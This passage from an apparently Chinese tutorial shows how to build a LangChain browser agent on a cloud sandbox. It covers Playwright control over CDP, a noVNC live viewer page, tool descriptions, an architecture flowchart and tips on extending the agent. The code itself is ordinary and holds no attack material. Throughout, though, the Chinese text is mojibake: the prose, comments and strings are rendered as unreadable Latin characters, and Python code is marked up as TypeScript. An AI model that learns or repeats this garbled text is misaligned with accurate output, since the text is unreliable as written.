<li><strong>ä¿¡å·å¤„ç†</strong>: æ•è· Ctrl+Cï¼Œç¡®ä¿èµ„æºæ­£ç¡®æ¸…ç†</li>
<li><strong>äº¤äº’æ¨¡å¼</strong>: æ”¯æŒæŒç»­å¯¹è¯ï¼Œå¤ç”¨ Sandbox å®ä¾‹</li>
</ol>
<h5 data-id="heading-18">VNC å¯è§†åŒ–é›†æˆ</h5>
<p>VNCï¼ˆVirtual Network Computingï¼‰åŠŸèƒ½å…è®¸æ‚¨å®æ—¶æŸ¥çœ‹å’Œç›‘æ§æµè§ˆå™¨åœ¨ Sandbox ä¸­çš„æ“ä½œè¿‡ç¨‹ï¼Œè¿™å¯¹äºè°ƒè¯•å’Œç›‘æ§ Agent è¡Œä¸ºéå¸¸æœ‰ç”¨ã€‚</p>
<p><strong>è·å– VNC URLï¼š</strong></p>
<p>åˆ›å»º Sandbox åï¼Œå¯ä»¥é€šè¿‡ <code>get_sandbox_info</code> tool è·å– VNC URLï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"># é€šè¿‡ <span class="hljs-title class_">Agent</span> è°ƒç”¨
result = agent.<span class="hljs-title function_">invoke</span>({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"è·å– sandbox ä¿¡æ¯"</span>}]
})

# æˆ–ç›´æ¥é€šè¿‡ç®¡ç†å™¨è·å–
manager = <span class="hljs-title function_">get_sandbox_manager</span>()
info = manager.<span class="hljs-title function_">get_info</span>()
vnc_url = info[<span class="hljs-string">'vnc_url'</span>]
</code></pre>
<p><strong>è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨ï¼š</strong></p>
<p>åœ¨ <code>main.py</code> ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨çš„åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-title class_">Path</span>

def <span class="hljs-title function_">open_vnc_viewer</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨"</span><span class="hljs-string">""</span>
    current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
    vnc_html_path = current_dir / <span class="hljs-string">"vnc.html"</span>
    
    <span class="hljs-keyword">if</span> vnc_html_path.<span class="hljs-title function_">exists</span>():
        # é€šè¿‡ <span class="hljs-variable constant_">URL</span> å‚æ•°ä¼ é€’ <span class="hljs-variable constant_">VNC</span> <span class="hljs-variable constant_">URL</span>
        encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
        file_url = f<span class="hljs-string">"file://{vnc_html_path}?url={encoded_url}"</span>
        webbrowser.<span class="hljs-title function_">open</span>(file_url)
</code></pre>
<p><strong>VNC HTML é¡µé¢ï¼š</strong></p>
<p><code>vnc.html</code> é¡µé¢ä¼šä» URL å‚æ•°ä¸­è¯»å– VNC URLï¼Œå¹¶è‡ªåŠ¨è¿æ¥åˆ° VNC æœåŠ¡å™¨ã€‚é¡µé¢åŒ…å«ä»¥ä¸‹æ ¸å¿ƒåŠŸèƒ½ï¼š</p>
<ol>
<li><strong>noVNC åº“åŠ è½½</strong>: ä» CDN åŠ¨æ€åŠ è½½ noVNC å®¢æˆ·ç«¯åº“</li>
<li><strong>è‡ªåŠ¨è¿æ¥</strong>: è¯»å– URL å‚æ•°ä¸­çš„ VNC URL å¹¶è‡ªåŠ¨è¿æ¥</li>
<li><strong>çŠ¶æ€æ˜¾ç¤º</strong>: æ˜¾ç¤ºè¿æ¥çŠ¶æ€ï¼ˆè¿æ¥ä¸­ã€å·²è¿æ¥ã€å·²æ–­å¼€ï¼‰</li>
<li><strong>æ‰‹åŠ¨æ§åˆ¶</strong>: æ”¯æŒæ‰‹åŠ¨è¾“å…¥ VNC URLã€æ–­å¼€é‡è¿ç­‰æ“ä½œ</li>
</ol>
<p>æ ¸å¿ƒ JavaScript ä»£ç ç‰‡æ®µï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä» URL å‚æ•°è·å– VNC URL</span>
<span class="hljs-keyword">const</span> urlParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
<span class="hljs-keyword">const</span> vncUrl = urlParams.<span class="hljs-title function_">get</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// åŠ è½½ noVNC åº“</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadNoVNC</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'https://cdn.jsdelivr.net/gh/novnc/noVNC@v1.4.0/core/rfb.js'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
}

<span class="hljs-comment">// è¿æ¥ VNC</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connectVNC</span>(<span class="hljs-params">url</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RFB</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadNoVNC</span>();
    rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(vncScreen, url, {
        <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> }
    });
    
    rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'VNC è¿æ¥æˆåŠŸ'</span>);
    });
}
</code></pre>
<p>å®Œæ•´çš„ <code>vnc.html</code> æ–‡ä»¶å¯ä»¥åœ¨ç¤ºä¾‹ä»£ç ä»“åº“ä¸­è·å–ã€‚</p>
<p><strong>æ‰‹åŠ¨ä½¿ç”¨ VNC æŸ¥çœ‹å™¨ï¼š</strong></p>
<p>å¦‚æœè‡ªåŠ¨æ‰“å¼€å¤±è´¥ï¼Œæ‚¨ä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ VNC æŸ¥çœ‹å™¨ï¼š</p>
<ol>
<li><strong>ä½¿ç”¨ noVNC åœ¨çº¿å®¢æˆ·ç«¯</strong>:
<ul>
<li>è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fnovnc.com%2FnoVNC%2Fvnc.html" target="_blank" title="https://novnc.com/noVNC/vnc.html" ref="nofollow noopener noreferrer">noVNC åœ¨çº¿å®¢æˆ·ç«¯</a></li>
<li>åœ¨è¿æ¥è®¾ç½®ä¸­å¡«å…¥ VNC URL</li>
<li>ç‚¹å‡»è¿æ¥</li>
</ul>
</li>
<li><strong>ä½¿ç”¨æœ¬åœ° VNC HTML é¡µé¢</strong>:
<ul>
<li>æ‰“å¼€ <code>vnc.html</code></li>
<li>è¾“å…¥ VNC URL</li>
<li>ç‚¹å‡»è¿æ¥æŒ‰é’®</li>
</ul>
</li>
</ol>
<p><strong>å®æ—¶ç›‘æ§åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰æµè§ˆå™¨æ“ä½œéƒ½ä¼šåœ¨ VNC ä¸­å®æ—¶æ˜¾ç¤º</li>
<li>å¯ä»¥çœ‹åˆ° Agent çš„æ¯ä¸€æ­¥æ“ä½œï¼ˆå¯¼èˆªã€ç‚¹å‡»ã€è¾“å…¥ç­‰ï¼‰</li>
<li>æ–¹ä¾¿è°ƒè¯•å’Œç›‘æ§ Agent è¡Œä¸º</li>
<li>æ”¯æŒäº¤äº’å¼æ“ä½œï¼ˆåœ¨ VNC ä¸­ç›´æ¥æ“ä½œæµè§ˆå™¨ï¼‰</li>
</ul>
<h5 data-id="heading-19">è¿è¡Œå’Œæµ‹è¯•</h5>
<pre><code class="hljs language-typescript" lang="typescript">python main.<span class="hljs-property">py</span>
</code></pre>
<p>ç¨‹åºä¼šè‡ªåŠ¨ï¼š</p>
<ol>
<li>åˆ›å»º Browser Sandbox</li>
<li>æ‰“å¼€ VNC æŸ¥çœ‹å™¨ï¼ˆå®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œï¼‰</li>
<li>æ‰§è¡Œé¢„è®¾æŸ¥è¯¢</li>
<li>è¿›å…¥äº¤äº’æ¨¡å¼</li>
</ol>
<h4 data-id="heading-20">å·¥ä½œåŸç†</h4>
<p>ä¸ºäº†æ›´å¥½åœ°ç†è§£ç³»ç»Ÿæ¶æ„ï¼Œæˆ‘ä»¬å°†å·¥ä½œæµç¨‹æ‹†åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>LangChain Agent å·¥ä½œæµç¨‹</strong>å’Œ <strong>SandboxManager ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ã€‚</p>
<h5 data-id="heading-21">1. LangChain Agent å·¥ä½œæµç¨‹</h5>
<p>ä¸‹å›¾å±•ç¤ºäº† LangChain Agent å¦‚ä½•å¤„ç†ç”¨æˆ·è¯·æ±‚å¹¶è°ƒç”¨ç›¸åº”çš„ Toolsï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    Start([ç”¨æˆ·å‘èµ·è¯·æ±‚&lt;br/&gt;ä¾‹: è®¿é—®ç½‘é¡µå¹¶æˆªå›¾]) --&gt; Agent[LangChain Agent&lt;br/&gt;åˆ†æç”¨æˆ·æ„å›¾]
    
    Agent --&gt; SelectTool{é€‰æ‹©åˆé€‚çš„ Tool}
    
    SelectTool --&gt;|é¦–æ¬¡ä½¿ç”¨| Tool1[create_browser_sandbox]
    SelectTool --&gt;|å¯¼èˆªç½‘é¡µ| Tool2[navigate_to_url]
    SelectTool --&gt;|æˆªå–å±å¹•| Tool3[take_screenshot]
    SelectTool --&gt;|æŸ¥è¯¢çŠ¶æ€| Tool4[get_sandbox_info]
    SelectTool --&gt;|æ¸…ç†èµ„æº| Tool5[destroy_sandbox]
    
    Tool1 --&gt; CallManager1[è°ƒç”¨ SandboxManager]
    Tool2 --&gt; CallManager2[è°ƒç”¨ SandboxManager]
    Tool3 --&gt; CallManager3[è°ƒç”¨ SandboxManager]
    Tool4 --&gt; CallManager4[è°ƒç”¨ SandboxManager]
    Tool5 --&gt; CallManager5[è°ƒç”¨ SandboxManager]
    
    CallManager1 --&gt; Manager[SandboxManager&lt;br/&gt;å•ä¾‹å®ä¾‹]
    CallManager2 --&gt; Manager
    CallManager3 --&gt; Manager
    CallManager4 --&gt; Manager
    CallManager5 --&gt; Manager
    
    Manager --&gt; ToolResult[Tool è¿”å›ç»“æœ]
    ToolResult --&gt; AgentProcess[Agent å¤„ç†ç»“æœ&lt;br/&gt;ç”Ÿæˆå“åº”]
    AgentProcess --&gt; Response([è¿”å›ç”¨æˆ·å‹å¥½çš„å“åº”])
    
    Response -.å¤šè½®å¯¹è¯.-&gt; Start
    
    style Agent fill:#667eea,color:#fff
    style Manager fill:#764ba2,color:#fff
    style Tool1 fill:#4ecdc4,color:#fff
    style Tool2 fill:#4ecdc4,color:#fff
    style Tool3 fill:#4ecdc4,color:#fff
    style Tool4 fill:#4ecdc4,color:#fff
    style Tool5 fill:#4ecdc4,color:#fff
</code></pre>
<p><strong>Agent å·¥ä½œæµç¨‹è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>è¯·æ±‚æ¥æ”¶</strong>ï¼šç”¨æˆ·å‘èµ·è‡ªç„¶è¯­è¨€è¯·æ±‚ï¼ˆå¦‚"è®¿é—®æ·˜å®é¦–é¡µå¹¶æˆªå›¾"ï¼‰</li>
<li><strong>æ„å›¾åˆ†æ</strong>ï¼šAgent åˆ†æç”¨æˆ·æ„å›¾ï¼Œå†³å®šéœ€è¦è°ƒç”¨å“ªäº› Tools</li>
<li><strong>Tool è°ƒç”¨</strong>ï¼šæ ¹æ®ä»»åŠ¡éœ€æ±‚ï¼Œé¡ºåºæˆ–ç»„åˆè°ƒç”¨å¤šä¸ª Tools</li>
<li><strong>Manager äº¤äº’</strong>ï¼šæ‰€æœ‰ Tools éƒ½é€šè¿‡ SandboxManager å•ä¾‹å®ä¾‹æ“ä½œ Sandbox</li>
<li><strong>ç»“æœå¤„ç†</strong>ï¼šAgent å°† Tool è¿”å›çš„ç»“æœæ•´åˆæˆç”¨æˆ·å‹å¥½çš„å“åº”</li>
<li><strong>å¤šè½®å¯¹è¯</strong>ï¼šSandbox åœ¨æ•´ä¸ªä¼šè¯ä¸­ä¿æŒæ´»è·ƒï¼Œæ”¯æŒå¤šè½®å¯¹è¯</li>
</ol>
<p><strong>5 ä¸ªæ ¸å¿ƒ Tools çš„èŒè´£ï¼š</strong></p>



































<table><thead><tr><th>Tool</th><th>åŠŸèƒ½</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>create_browser_sandbox</code></td><td>åˆ›å»º Sandbox å®ä¾‹</td><td>é¦–æ¬¡ä½¿ç”¨æˆ– Sandbox å·²é”€æ¯æ—¶</td></tr><tr><td><code>navigate_to_url</code></td><td>å¯¼èˆªåˆ°æŒ‡å®š URL</td><td>éœ€è¦è®¿é—®ç½‘é¡µæ—¶</td></tr><tr><td><code>take_screenshot</code></td><td>æˆªå–å½“å‰é¡µé¢</td><td>éœ€è¦ä¿å­˜é¡µé¢å¿«ç…§æ—¶</td></tr><tr><td><code>get_sandbox_info</code></td><td>è·å– Sandbox ä¿¡æ¯</td><td>æŸ¥çœ‹çŠ¶æ€æˆ–è·å– VNC URL æ—¶</td></tr><tr><td><code>destroy_sandbox</code></td><td>é”€æ¯ Sandbox å®ä¾‹</td><td>ä»»åŠ¡å®Œæˆæˆ–éœ€è¦é‡Šæ”¾èµ„æºæ—¶</td></tr></tbody></table>
<h5 data-id="heading-22">2. SandboxManager ç”Ÿå‘½å‘¨æœŸç®¡ç†</h5>
<p>ä¸‹å›¾å±•ç¤ºäº† SandboxManager å¦‚ä½•ç®¡ç† Sandbox çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸï¼š</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/svg/132256418/1767589910006-102dcf23-d720-44b7-9907-b32509a77adb.svg" alt="" loading="lazy"/></p>
<p><strong>SandboxManager å·¥ä½œæµç¨‹è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å•ä¾‹ç®¡ç†</strong>ï¼š
<ul>
<li>é¦–æ¬¡è°ƒç”¨æ—¶åˆ›å»º Manager å®ä¾‹</li>
<li>åç»­è°ƒç”¨å¤ç”¨åŒä¸€ä¸ªå®ä¾‹</li>
<li>ç¡®ä¿æ•´ä¸ªä¼šè¯åªæœ‰ä¸€ä¸ª Sandbox</li>
</ul>
</li>
<li><strong>Sandbox åˆ›å»º</strong>ï¼š
<ul>
<li>è°ƒç”¨ AgentRun SDK çš„ Sandbox.create()</li>
<li>SDK é€šè¿‡é˜¿é‡Œäº‘ API ä¸å‡½æ•°è®¡ç®— FC é€šä¿¡</li>
<li>FC æœåŠ¡åˆ›å»ºç‹¬ç«‹çš„å®¹å™¨å®ä¾‹ï¼ŒåŒ…å«ï¼š
<ul>
<li>Chromium æµè§ˆå™¨VNC æœåŠ¡å¿…è¦çš„è¿è¡Œç¯å¢ƒ</li>
</ul>
</li>
</ul>
</li>
<li><strong>è¿æ¥ä¿¡æ¯è·å–</strong>ï¼š
<ul>
<li><strong>CDP URL</strong>ï¼šWebSocket åœ°å€ï¼Œç”¨äº Playwright/Puppeteer è¿œç¨‹æ§åˆ¶æµè§ˆå™¨</li>
<li><strong>VNC URL</strong>ï¼šWebSocket åœ°å€ï¼Œç”¨äºå®æ—¶æŸ¥çœ‹æµè§ˆå™¨ç”»é¢</li>
</ul>
</li>
<li><strong>æµè§ˆå™¨æ“ä½œ</strong>ï¼š
<ul>
<li>Playwright é€šè¿‡ CDP URL è¿æ¥åˆ°è¿œç¨‹æµè§ˆå™¨</li>
<li>æ‰§è¡Œå„ç§æµè§ˆå™¨æ“ä½œï¼ˆå¯¼èˆªã€ç‚¹å‡»ã€æˆªå›¾ç­‰ï¼‰</li>
<li>VNC åŒæ­¥æ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ï¼Œç”¨æˆ·å¯å®æ—¶ç›‘æ§</li>
</ul>
</li>
<li><strong>èµ„æºæ¸…ç†</strong>ï¼š
<ul>
<li>è°ƒç”¨ destroy() æ–¹æ³•é”€æ¯ Sandbox</li>
<li>æ¸…ç† Manager å†…éƒ¨çŠ¶æ€</li>
<li>é€šè¿‡ SDK é‡Šæ”¾äº‘ç«¯èµ„æº</li>
</ul>
</li>
</ol>
<h5 data-id="heading-23">3. Agent ä¸ Manager çš„åä½œå…³ç³»</h5>
<p><strong>äº¤äº’æ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-latex" lang="latex">ç”¨æˆ·è¯·æ±‚ â†’ Agent â†’ Tool â†’ SandboxManager â†’ AgentRun SDK â†’ äº‘ç«¯ Sandbox
                                    â†“
ç”¨æˆ·å“åº” â† Agent â† Tool â† SandboxManager â† æ“ä½œç»“æœ
</code></pre>
<p><strong>å…³é”®è®¾è®¡ç†å¿µï¼š</strong></p>
<ol>
<li><strong>åˆ†å±‚æ¶æ„</strong>ï¼š
<ul>
<li><strong>ç”¨æˆ·å±‚</strong>ï¼šè‡ªç„¶è¯­è¨€äº¤äº’</li>
<li><strong>Agent å±‚</strong>ï¼šæ„å›¾ç†è§£å’Œä»»åŠ¡åˆ†è§£</li>
<li><strong>Tool å±‚</strong>ï¼šåŠŸèƒ½å°è£…å’Œå‚æ•°éªŒè¯</li>
<li><strong>Manager å±‚</strong>ï¼šèµ„æºç®¡ç†å’ŒçŠ¶æ€ç»´æŠ¤</li>
<li><strong>SDK å±‚</strong>ï¼šäº‘æœåŠ¡é€šä¿¡</li>
<li><strong>äº‘ç«¯å±‚</strong>ï¼šå®é™…çš„ Sandbox ç¯å¢ƒ</li>
</ul>
</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>ï¼š
<ul>
<li>SandboxManager ä½¿ç”¨å•ä¾‹æ¨¡å¼</li>
<li>ä¿è¯æ•´ä¸ªä¼šè¯ä¸­åªæœ‰ä¸€ä¸ª Sandbox å®ä¾‹</li>
<li>é¿å…èµ„æºæµªè´¹å’ŒçŠ¶æ€å†²çª</li>
</ul>
</li>
<li><strong>çŠ¶æ€å¤ç”¨</strong>ï¼š
<ul>
<li>Sandbox åœ¨å¤šè½®å¯¹è¯ä¸­ä¿æŒæ´»è·ƒ</li>
<li>å‡å°‘åˆ›å»ºå’Œé”€æ¯çš„å¼€é”€</li>
<li>æä¾›æ›´æµç•…çš„ç”¨æˆ·ä½“éªŒ</li>
</ul>
</li>
<li><strong>åŒé€šé“è®¾è®¡</strong>ï¼š
<ul>
<li><strong>CDP é€šé“</strong>ï¼šAgent é€šè¿‡ Playwright æ§åˆ¶æµè§ˆå™¨</li>
<li><strong>VNC é€šé“</strong>ï¼šç”¨æˆ·é€šè¿‡ VNC æŸ¥çœ‹å™¨å®æ—¶ç›‘æ§</li>
</ul>
</li>
<li><strong>è§£è€¦è®¾è®¡</strong>ï¼š
<ul>
<li>Tools ä¸ç›´æ¥æ“ä½œ SDKï¼Œé€šè¿‡ Manager ç»Ÿä¸€ç®¡ç†</li>
<li>ä¾¿äºæ‰©å±•å’Œç»´æŠ¤</li>
<li>ç»Ÿä¸€çš„é”™è¯¯å¤„ç†å’Œèµ„æºç®¡ç†</li>
</ul>
</li>
</ol>
<p><strong>å…¸å‹ä½¿ç”¨åœºæ™¯ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"># ç¬¬ <span class="hljs-number">1</span> è½®å¯¹è¯
ç”¨æˆ·: <span class="hljs-string">"åˆ›å»ºä¸€ä¸ª sandbox å¹¶è®¿é—®æ·˜å®é¦–é¡µ"</span>
â†’ <span class="hljs-title class_">Agent</span> è°ƒç”¨: create_browser_sandbox â†’ navigate_to_url
â†’ <span class="hljs-title class_">Manager</span>: åˆ›å»º <span class="hljs-title class_">Sandbox</span> â†’ <span class="hljs-title class_">Playwright</span> å¯¼èˆª
â†’ ç»“æœ: <span class="hljs-string">"Sandbox å·²åˆ›å»ºï¼Œå·²è®¿é—®æ·˜å®é¦–é¡µ"</span>

# ç¬¬ <span class="hljs-number">2</span> è½®å¯¹è¯ï¼ˆå¤ç”¨ <span class="hljs-title class_">Sandbox</span>ï¼‰
ç”¨æˆ·: <span class="hljs-string">"æˆªå–å½“å‰é¡µé¢"</span>
â†’ <span class="hljs-title class_">Agent</span> è°ƒç”¨: take_screenshot
â†’ <span class="hljs-title class_">Manager</span>: ä½¿ç”¨ç°æœ‰ <span class="hljs-title class_">Sandbox</span> â†’ <span class="hljs-title class_">Playwright</span> æˆªå›¾
â†’ ç»“æœ: <span class="hljs-string">"æˆªå›¾å·²ä¿å­˜"</span>

# ç¬¬ <span class="hljs-number">3</span> è½®å¯¹è¯ï¼ˆå¤ç”¨ <span class="hljs-title class_">Sandbox</span>ï¼‰
ç”¨æˆ·: <span class="hljs-string">"è®¿é—®äº¬ä¸œé¦–é¡µ"</span>
â†’ <span class="hljs-title class_">Agent</span> è°ƒç”¨: navigate_to_url
â†’ <span class="hljs-title class_">Manager</span>: ä½¿ç”¨ç°æœ‰ <span class="hljs-title class_">Sandbox</span> â†’ <span class="hljs-title class_">Playwright</span> å¯¼èˆª
â†’ ç»“æœ: <span class="hljs-string">"å·²è®¿é—®äº¬ä¸œé¦–é¡µ"</span>
</code></pre>
<p>é€šè¿‡è¿™ç§è®¾è®¡ï¼ŒAgent ä¸“æ³¨äºç†è§£ç”¨æˆ·æ„å›¾å’Œä»»åŠ¡ç¼–æ’ï¼Œè€Œ Manager ä¸“æ³¨äº Sandbox çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå®ç°äº†æ¸…æ™°çš„èŒè´£åˆ†ç¦»ã€‚</p>
<p><strong>å·¥ä½œåŸç†æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>å·¥å…·æ³¨å†Œ</strong>: ä½¿ç”¨ <code>@tool</code> è£…é¥°å™¨å°† Sandbox åŠŸèƒ½å°è£…ä¸º LangChain tools</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>: <code>SandboxManager</code> è´Ÿè´£ Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯</li>
<li><strong>çŠ¶æ€ä¿æŒ</strong>: ä½¿ç”¨å•ä¾‹æ¨¡å¼ç®¡ç† Sandbox å®ä¾‹ï¼Œç¡®ä¿åŒä¸€ä¼šè¯å†…å¤ç”¨</li>
<li><strong>VNC é›†æˆ</strong>: è‡ªåŠ¨è·å–å¹¶è¿”å› VNC URLï¼Œæ–¹ä¾¿ç”¨æˆ·å®æ—¶æŸ¥çœ‹</li>
<li><strong>é”™è¯¯å¤„ç†</strong>: æ‰€æœ‰å·¥å…·éƒ½åŒ…å«å®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶</li>
</ol>
<h4 data-id="heading-24">æ‰©å±•å’Œå®šåˆ¶</h4>
<p><strong>æ·»åŠ è‡ªå®šä¹‰ Toolsï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">extract_table_data</span>(<span class="hljs-attr">url</span>: str) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"ä»ç½‘é¡µä¸­æå–è¡¨æ ¼æ•°æ®"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
    
    manager = <span class="hljs-title function_">get_sandbox_manager</span>()
    cdp_url = manager.<span class="hljs-title function_">get_info</span>()[<span class="hljs-string">'cdp_url'</span>]
    
    <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
        browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
        page = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span>[<span class="hljs-number">0</span>]
        page.<span class="hljs-title function_">goto</span>(url)
        tables = page.<span class="hljs-title function_">query_selector_all</span>(<span class="hljs-string">"table"</span>)
        <span class="hljs-keyword">return</span> f<span class="hljs-string">"æ‰¾åˆ° {len(tables)} ä¸ªè¡¨æ ¼"</span>
</code></pre>
<p><strong>è‡ªå®šä¹‰æç¤ºè¯ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript">custom_prompt = <span class="hljs-string">""</span><span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç½‘é¡µæ•°æ®æå–åŠ©æ‰‹ã€‚
åœ¨æ‰§è¡Œä»»åŠ¡å‰ï¼Œè¯·å…ˆåˆ›å»º sandboxï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨å·¥å…·å®Œæˆä»»åŠ¡ã€‚"</span><span class="hljs-string">""</span>

agent = <span class="hljs-title function_">create_browser_agent</span>(system_prompt=custom_prompt)
</code></pre>
<h4 data-id="heading-25">æœ€ä½³å®è·µ</h4>
<ol>
<li><strong>æ¨¡å—åŒ–è®¾è®¡</strong>: å°† Sandbox ç®¡ç†å’Œ Agent åˆ›å»ºåˆ†ç¦»ï¼Œæé«˜ä»£ç å¯ç»´æŠ¤æ€§</li>
<li><strong>é”™è¯¯å¤„ç†</strong>: æ‰€æœ‰å·¥å…·éƒ½åº”åŒ…å«å®Œå–„çš„é”™è¯¯å¤„ç†</li>
<li><strong>èµ„æºæ¸…ç†</strong>: ä½¿ç”¨ä¿¡å·å¤„ç†å™¨ç¡®ä¿èµ„æºæ­£ç¡®æ¸…ç†</li>
<li><strong>VNC æç¤º</strong>: åœ¨å·¥å…·è¿”å›ä¸­åŒ…å« VNC URLï¼Œæ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>: ç¡®ä¿ Sandbox å®ä¾‹åœ¨ä¼šè¯ä¸­å¤ç”¨ï¼Œé¿å…é‡å¤åˆ›å»º</li>
</ol>
<h2 data-id="heading-26">å‰ç«¯é›†æˆå¯è§†åŒ–ç›‘æ§ï¼ˆVNCï¼‰</h2>
<h3 data-id="heading-27">VNC é›†æˆæ¶æ„</h3>
<p>ä¸‹å›¾å±•ç¤ºäº†å‰ç«¯å¦‚ä½•é›†æˆ VNC å®ç°å®æ—¶ç›‘æ§ï¼š</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/__mermaid_v3/b8d70d84485d4871126222501c457254.svg" alt="" loading="lazy"/></p>
<h3 data-id="heading-28">è½»é‡çº§ HTML é¡µé¢é›†æˆ</h3>
<p>åˆ›å»ºä¸€ä¸ªç®€å•çš„ <code>vnc-viewer.html</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Browser Sandbox VNC æŸ¥çœ‹å™¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>; }
        <span class="hljs-selector-id">#vnc-container</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"vnc-container"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
        <span class="hljs-keyword">const</span> vncUrl = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">'url'</span>);
        
        <span class="hljs-keyword">if</span> (!vncUrl) {
